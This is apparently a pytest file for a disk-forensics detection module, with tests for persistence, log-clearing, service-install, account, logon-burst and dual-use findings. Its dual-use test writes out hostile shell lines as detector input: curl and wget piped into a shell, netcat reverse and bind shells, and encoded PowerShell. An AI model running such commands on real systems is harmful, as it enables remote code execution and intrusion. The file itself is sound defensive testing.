# ruff: noqa: E501 - test data tables (long literal command lines and paths)
"""Event rules (single streaming pass): persistence, log clearing, service installs, account
changes, remote logons and failure bursts, dual-use execution; unknown EVTX layouts are skipped
and counted."""

from datetime import timedelta
from typing import Any

from cyberlab_jobs.disk import DiskEventRecord
from cyberlab_jobs.results import FindingRecord

from dataset import records as r
from dataset.baselines import Draft
from disk_worker import detections

LIMITS = r.limits()
NTFS, EXT = r.NTFS_PARTITION, r.EXT_PARTITION
T0 = r.ts("2026-10-06T10:00:00")
SECURITY = "Microsoft-Windows-Security-Auditing"
EVENTLOG = "Microsoft-Windows-Eventlog"
SCM = "Service Control Manager"


def draft() -> Draft:
    return Draft(
        "unit", "triage", [r.partition(EXT, "ext4", "linux"), r.partition(NTFS, "ntfs", "windows")]
    )


def run(d: Draft) -> detections.DiskDetectionOutput:
    out = detections.run(d.view(), LIMITS)
    assert isinstance(out, detections.DiskDetectionOutput)
    return out


def of(out: detections.DiskDetectionOutput, kind: str) -> list[FindingRecord]:
    return [f for f in out.findings if f.type == kind]


# --- persistence ----------------------------------------------------------------------------


def test_run_key_into_temp_resolves_the_listed_file() -> None:
    d = draft()
    exe = d.add_file(
        NTFS, "Users/alice/AppData/Local/Temp/u.exe", magic="pe", mtime=T0 - timedelta(hours=5)
    )
    event = d.add_run_key(
        T0,
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        ["u: C:\\Users\\alice\\AppData\\Local\\Temp\\u.exe"],
    )
    out = run(d)
    (finding,) = of(out, "disk_persistence_run_key")
    assert finding.severity == "medium"
    assert f"event:{event.ordinal}" in finding.evidence_refs
    assert f"file:{NTFS}:{exe.meta_addr}:1" in finding.evidence_refs
    assert event.ordinal in out.cited_events
    assert any(i.type == "file_sha256" and i.value == exe.sha256 for i in out.iocs)


def test_run_keys_elsewhere_are_silent() -> None:
    d = draft()
    d.add_run_key(
        T0,
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        [
            "SecurityHealth: %windir%\\system32\\SecurityHealthSystray.exe",
            'OneDrive: "C:\\Users\\a\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
        ],
    )
    d.add_service_key(
        T0,
        "WinDefend",
        '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.1-0\\MsMpEng.exe"',
    )
    d.add_service_key(T0, "svc", "%SystemRoot%\\system32\\svchost.exe -k netsvcs")
    assert run(d).findings == []


def test_service_key_in_programdata_and_secret_masked() -> None:
    d = draft()
    d.add_service_key(T0, "Sync", '"C:\\ProgramData\\Sync\\sync.exe" --password=Hunter2Hunter2')
    (finding,) = of(run(d), "disk_persistence_service")
    assert (
        "Hunter2Hunter2" not in finding.description and "Hu************(14)" in finding.description
    )


def test_listing_only_entries_need_the_window() -> None:
    d = draft()
    # the window ends at the newest event (T0) and starts 7 days earlier
    d.add_syslog(
        T0,
        "CRON",
        "(root) CMD (cd / && run-parts --report /etc/cron.hourly)",
        path="var/log/syslog",
        artifact="syslog",
    )
    d.add_file(EXT, "etc/cron.d/new", mtime=T0 - timedelta(days=1))
    d.add_file(EXT, "etc/cron.d/old", mtime=T0 - timedelta(days=30))
    d.add_file(EXT, "etc/systemd/system/x.service", mtime=T0 - timedelta(days=2))
    d.add_file(EXT, "lib/systemd/system/packaged.service", mtime=T0 - timedelta(days=2))
    d.add_file(EXT, "home/a/.ssh/authorized_keys", mtime=T0 - timedelta(days=3))
    d.add_file(NTFS, "Windows/System32/Tasks/New", mtime=T0 - timedelta(days=1))
    d.add_file(NTFS, "Windows/System32/Tasks/Old", mtime=T0 - timedelta(days=60))
    d.add_file(EXT, "etc/ld.so.preload", size=0, mtime=T0)  # empty: not a finding
    found = sorted((f.type, f.attributes["subject"]) for f in run(d).findings)
    assert found == [
        ("disk_persistence_authorized_keys", "home/a/.ssh/authorized_keys"),
        ("disk_persistence_cron_file", "etc/cron.d/new"),
        ("disk_persistence_systemd_unit", "etc/systemd/system/x.service"),
        ("disk_persistence_task", "Windows/System32/Tasks/New"),
    ]


def test_cron_runs_from_tmp_are_one_finding_citing_runs() -> None:
    d = draft()
    events = [
        d.add_syslog(
            T0 + timedelta(minutes=k),
            "CRON",
            "(root) CMD (/tmp/.x/m -B)",
            path="var/log/syslog",
            artifact="syslog",
        )
        for k in range(30)
    ]
    out = run(d)
    (finding,) = of(out, "disk_persistence_cron_exec")
    assert (
        finding.attributes["subject"] == "/tmp/.x/m"
        and finding.attributes["cited_events_omitted"] == 10
    )
    assert {f"event:{e.ordinal}" for e in events[:20]} == {
        x for x in finding.evidence_refs if x.startswith("event:")
    }
    assert not out.truncated and out.truncated_parts == {"cited_events": True}


# --- log clearing ---------------------------------------------------------------------------


def test_1102_and_104_but_not_other_providers() -> None:
    d = draft()
    d.add_evtx(T0, EVENTLOG, 1102, r.log_cleared_strings("eve"))
    d.add_evtx(T0, EVENTLOG, 104, r.channel_cleared_strings("Application"), "System")
    d.add_evtx(T0, "VSS", 104, ["x"], "Application")
    d.add_evtx(T0, SECURITY, 1102, ["x"])
    out = run(d)
    found = sorted((f.attributes["channel"], f.severity) for f in of(out, "disk_log_cleared"))
    assert found == [("Application", "medium"), ("Security", "medium")]
    assert "eve" in next(
        f.description for f in out.findings if f.attributes["channel"] == "Security"
    )


def test_unknown_1102_layout_still_counts_the_clearing() -> None:
    d = draft()
    d.add_evtx(T0, EVENTLOG, 1102, ["eve"])
    out = run(d)
    (finding,) = out.findings
    assert "account: unknown" in finding.description
    assert out.counts["evtx_layout_unknown"] == 1


def test_emptied_logs_need_rotated_siblings() -> None:
    d = draft()
    d.add_file(EXT, "var/log/auth.log", size=0, mtime=T0)
    d.add_file(EXT, "var/log/auth.log.1", size=1000, mtime=T0)
    d.add_file(EXT, "var/log/wtmp", size=384 * 3, mtime=T0)  # whole records: fine
    d.add_file(EXT, "var/log/wtmp.1", size=384 * 9, mtime=T0)
    d.add_file(EXT, "var/log/btmp", size=0, mtime=T0)  # not in the rule
    d.add_file(EXT, "var/log/secure", size=0, mtime=T0)  # no rotated sibling
    found = [f.attributes["subject"] for f in of(run(d), "disk_log_emptied")]
    assert found == ["var/log/auth.log"]


# --- services, accounts -----------------------------------------------------------------------


def test_service_installs_by_location() -> None:
    d = draft()
    for name, image in (
        ("a", "C:\\Users\\Public\\a.exe"),
        ("b", "C:\\Tools\\b.exe"),
        ("c", '"C:\\Program Files\\Vendor\\c.exe" -service'),
        ("d", "\\SystemRoot\\System32\\drivers\\d.sys"),
    ):
        d.add_evtx(T0, SCM, 7045, r.service_strings(name, image), "System")
    d.add_evtx(T0, SCM, 7045, ["e", "C:\\Users\\Public\\e.exe"], "System")  # unknown layout
    out = run(d)
    assert sorted((f.attributes["subject"], f.severity) for f in out.findings) == [
        ("a", "medium"),
        ("b", "low"),
    ]
    assert out.counts["evtx_layout_unknown"] == 1 and out.counts["service_standard_location"] == 2


def test_account_changes_windows_and_linux() -> None:
    d = draft()
    d.add_evtx(T0, SECURITY, 4720, r.user_created_strings("x1"))
    d.add_evtx(T0, SECURITY, 4732, r.group_member_strings("-", "Administrators"))
    d.add_syslog(
        T0, "useradd", "new user: name=svc, UID=998, GID=998, home=/, shell=/usr/sbin/nologin"
    )
    d.add_syslog(
        T0, "useradd", "new user: name=dev, UID=1000, GID=1000, home=/home/dev, shell=/bin/bash"
    )
    d.add_syslog(T0, "usermod", "add 'dev' to group 'sudo'")
    d.add_syslog(T0, "usermod", "add 'dev' to shadow group 'sudo'")
    d.add_syslog(T0, "usermod", "add 'dev' to group 'plugdev'")
    d.add_syslog(T0, "sudo", "dev : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd x")
    out = run(d)
    assert sorted((f.type, f.attributes["subject"]) for f in out.findings) == [
        ("disk_account_created", "WKS-01\\x1"),
        ("disk_account_created", "dev"),
        ("disk_group_member_added", "S-1-5-21-1-2-3-1201"),
        ("disk_group_member_added", "dev"),
    ]
    assert all(f.severity == "low" for f in out.findings)


# --- logons -------------------------------------------------------------------------------------


def test_remote_logons_are_aggregated_and_loopback_ignored() -> None:
    d = draft()
    for k in range(3):
        d.add_evtx(
            T0 + timedelta(hours=k), SECURITY, 4624, r.logon_strings("alice", 10, "203.0.113.5")
        )
    for ip, logon_type in (
        ("-", 3),
        ("127.0.0.1", 3),
        ("::1", 10),
        ("::ffff:127.0.0.1", 3),
        ("203.0.113.6", 2),
        ("203.0.113.7", 5),
    ):
        d.add_evtx(T0, SECURITY, 4624, r.logon_strings("bob", logon_type, ip))
    d.add_syslog(
        T0, "sshd", "Accepted publickey for root from 198.51.100.3 port 2222 ssh2: RSA SHA256:x"
    )
    d.add_syslog(T0, "sshd", "Accepted password for root from 127.0.0.1 port 2222 ssh2")
    out = run(d)
    found = sorted((f.attributes["subject"], f.attributes["count"]) for f in out.findings)
    assert found == [("198.51.100.3", 1), ("203.0.113.5", 3)]
    rdp = next(f for f in out.findings if f.attributes["subject"] == "203.0.113.5")
    assert str(rdp.src_ip) == "203.0.113.5" and rdp.ts == T0
    assert {i.value for i in out.iocs if i.type == "ip"} == {"203.0.113.5", "198.51.100.3"}


def _failures(
    d: Draft, n: int, step_s: int, ip: str = "198.51.100.66", start: Any = T0
) -> list[DiskEventRecord]:
    return [
        d.add_evtx(
            start + timedelta(seconds=step_s * k),
            SECURITY,
            4625,
            r.failed_logon_strings("admin", ip),
        )
        for k in range(n)
    ]


def test_failure_burst_threshold() -> None:
    d = draft()
    _failures(d, 20, 25)  # 20 within 8 minutes: a burst
    _failures(d, 19, 10, "198.51.100.67")  # 19: not
    _failures(d, 40, 70, "198.51.100.68")  # 40 spread at 70 s: never 20 within 10 minutes
    out = run(d)
    (burst,) = out.findings
    assert (burst.type, burst.severity, burst.attributes["subject"], burst.attributes["count"]) == (
        "disk_logon_failure_burst",
        "medium",
        "198.51.100.66",
        20,
    )


def test_burst_cites_early_events_even_when_they_arrive_out_of_order() -> None:
    """RT10: a burst found at the end of the stream still cites events read long before; input
    order does not matter (minute buckets)."""
    d = draft()
    late = _failures(d, 12, 20, start=T0 + timedelta(minutes=4))
    d.add_evtx(T0 + timedelta(days=1), SECURITY, 4624, r.logon_strings("alice", 2, "-"))
    early = _failures(d, 12, 20)
    out = run(d)
    (burst,) = out.findings
    cited = {int(x.split(":")[1]) for x in burst.evidence_refs}
    assert cited <= out.cited_events
    assert cited & {e.ordinal for e in early} and cited & {e.ordinal for e in late}


def test_ssh_failure_burst() -> None:
    d = draft()
    for k in range(25):
        d.add_syslog(
            T0 + timedelta(seconds=5 * k),
            "sshd",
            f"Failed password for invalid user u{k} from 203.0.113.99 port {4000 + k} ssh2",
        )
    (burst,) = run(d).findings
    assert burst.attributes["subject"] == "203.0.113.99" and burst.attributes["source"] == "sshd"


# --- dual use -------------------------------------------------------------------------------------


def test_dual_use_patterns_and_near_misses() -> None:
    d = draft()
    lines = {
        "curl -fsSL http://198.51.100.1/a | sudo bash": "medium",
        "wget -qO- http://198.51.100.2/b.sh|sh": "medium",
        "ncat 198.51.100.3 4444 -e /bin/bash": "medium",
        "nc -lvnp 4444 -e /bin/sh": "medium",
        "rclone sync /data s3:bucket": "low",
        # near misses
        "curl -O https://example.org/a.tar.gz": None,
        "nc -zv 10.0.0.1 22": None,
        "ncat --version": None,
        "echo psexecutable": None,
    }
    for k, line in enumerate(lines):
        d.add_bash(T0 + timedelta(minutes=k), line)
    for k, command in enumerate(
        (
            "powershell -EncodedCommand SQBFAFgAIAAoAA==",
            "pwsh -nop -ec SQBFAFgAIAAoAA==",
            "powershell -ExecutionPolicy Unrestricted -File x.ps1",
            "powershell -ep bypass -enc SQBFAFgAIAAoAA==",
            "wevtutil qe Security",
            "vssadmin list shadows",
            "certutil -hashfile x SHA256",
        )
    ):
        image = command.split(" ", 1)[0]
        d.add_evtx(
            T0 + timedelta(hours=1, minutes=k),
            SECURITY,
            4688,
            r.process_strings(f"C:\\Windows\\System32\\{image}.exe", command),
        )
    out = run(d)
    got = sorted((f.attributes["subject"], f.severity) for f in out.findings)
    assert got == sorted(
        [
            ("Shell history:curl | sh", "medium"),
            ("Shell history:curl | sh", "medium"),
            ("Shell history:nc -e", "medium"),
            ("Shell history:nc -e", "medium"),
            ("Shell history:rclone", "low"),
            ("EVTX 4688:powershell -enc", "medium"),
            ("EVTX 4688:powershell -enc", "medium"),
            ("EVTX 4688:powershell -enc", "medium"),
        ]
    )


def test_execution_artifacts_name_tools() -> None:
    d = draft()
    d.add_prefetch(T0, "PSEXEC.EXE", "\\TOOLS\\PSEXEC.EXE")
    d.add_prefetch(T0 + timedelta(days=1), "PSEXEC.EXE", "\\TOOLS\\PSEXEC.EXE")
    d.add_prefetch(T0, "CHROME.EXE", "\\PROGRAM FILES\\CHROME.EXE")
    d.add_event(
        T0,
        "amcache",
        "windows:registry:amcache",
        "Windows/AppCompat/Programs/Amcache.hve",
        "path: c:\\tools\\procdump64.exe sha1: 0bfe",
        {},
    )  # message fallback
    out = run(d)
    got = sorted((f.attributes["subject"], f.severity, len(f.evidence_refs)) for f in out.findings)
    assert got == [("Amcache:procdump", "low", 1), ("Prefetch:psexec", "low", 2)]


def test_dual_use_iocs_come_from_masked_text() -> None:
    d = draft()
    d.add_bash(T0, "curl -s http://u:TopSecretPw9@198.51.100.9/x.sh?token=abc | sh")
    out = run(d)
    values = [i.value for i in out.iocs]
    assert "198.51.100.9" in values
    assert not any("TopSecretPw9" in v for v in values)
    assert "TopSecretPw9" not in out.findings[0].description


def test_files_and_events_together_are_deterministic() -> None:
    def build() -> detections.DiskDetectionOutput:
        d = draft()
        d.add_file(NTFS, "Users/Public/x.exe", magic="pe", mtime=T0)
        d.add_evtx(T0, EVENTLOG, 1102, r.log_cleared_strings())
        return run(d)

    assert build() == build()
